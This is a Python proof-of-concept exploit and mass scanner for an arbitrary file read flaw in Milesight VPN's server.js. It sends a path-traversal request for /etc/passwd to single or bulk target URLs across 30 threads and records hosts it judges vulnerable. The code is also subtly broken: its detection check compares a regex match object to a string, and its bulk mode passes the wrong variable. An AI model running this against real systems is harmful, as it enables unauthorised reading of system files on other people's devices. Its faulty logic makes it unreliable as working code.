#Milesight VPN server.js 任意文件读取漏洞poc
import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    text="""


███╗   ███╗██╗██╗     ███████╗███████╗██╗ ██████╗ ██╗  ██╗████████╗   ██╗   ██╗██████╗ ███╗   ██╗
████╗ ████║██║██║     ██╔════╝██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝   ██║   ██║██╔══██╗████╗  ██║
██╔████╔██║██║██║     █████╗  ███████╗██║██║  ███╗███████║   ██║█████╗██║   ██║██████╔╝██╔██╗ ██║
██║╚██╔╝██║██║██║     ██╔══╝  ╚════██║██║██║   ██║██╔══██║   ██║╚════╝╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
██║ ╚═╝ ██║██║███████╗███████╗███████║██║╚██████╔╝██║  ██║   ██║       ╚████╔╝ ██║     ██║ ╚████║
╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝        ╚═══╝  ╚═╝     ╚═╝  ╚═══╝
                                                                                                 
                                                        author:zm
"""
    print(text)
def main():
    banner()
    parser=argparse.ArgumentParser(description='This is Milesight VPN server-side arbitrary file read vulnerability')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    parser.add_argument('-t','--txt',dest='txt',type=str,help='Please enter the text you want to output')
    arges=parser.parse_args()
    if arges.url and not arges.file:
        poc(arges.url,arges.txt)
    elif arges.file and not arges.url:
        url_line=[]
        with open(arges.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_line.append(url.strip())
        mp=Pool(30)
        mp.starmap(poc, [(url, arges.txt)])
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target,target1):
    api='/../etc/passwd'
    header={
        'Content-Type':'application/x-www-form-urlencoded'
    }
    try:
        res1=requests.get(url=target+api,headers=header,timeout=5,verify=False)
        match=re.search(r':/([^:]+)$',res1.text)
        if match=='/bin/bash':
            print(f"[+]{target} have loophole “{target+api}”")
            with open (target1,'a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target} not have loophole “{target+api}”")
    except:
        pass

if __name__=='__main__':
    main()